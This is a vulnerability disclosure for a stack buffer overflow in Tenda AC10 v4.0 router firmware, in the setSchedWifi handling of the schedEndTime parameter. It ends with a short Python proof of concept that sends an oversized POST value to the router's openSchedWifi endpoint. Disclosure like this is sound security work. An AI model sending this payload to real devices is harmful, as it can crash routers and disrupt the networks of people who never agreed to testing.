## Overview

- Manufacturer's website information：https://www.tenda.com.cn/

- Firmware download website: https://www.tenda.com.cn/download/detail-3506.html

## Affected version

AC10 v4.0 V16.03.10.13

## Vulnerability details

The Tenda AC10 v4.0 V16.03.10.13 firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `v8` variable receives the `schedEndTime` parameter from a POST request and is later assigned to the `ptr` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedEndTime`, the statement `strcpy((char *)ptr + 10, v20);` can cause a buffer overflow. The user-provided `schedEndTime` can exceed the capacity of the `ptr` array, triggering this security vulnerability.

![image-20240309153227226](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309153227226.png)

![image-20240309153341162](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309153341162.png)

The user-provided `schedEndTime` can trigger this security vulnerability.

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedEndTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240309153429195](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309153429195.png)